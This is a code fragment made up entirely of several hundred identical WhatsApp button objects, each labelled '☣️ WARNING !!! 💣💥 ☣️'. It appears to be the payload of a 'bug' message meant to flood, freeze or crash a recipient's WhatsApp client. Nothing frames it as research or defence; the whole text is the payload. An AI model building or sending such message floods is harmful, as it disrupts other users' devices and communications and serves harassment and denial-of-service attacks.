{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
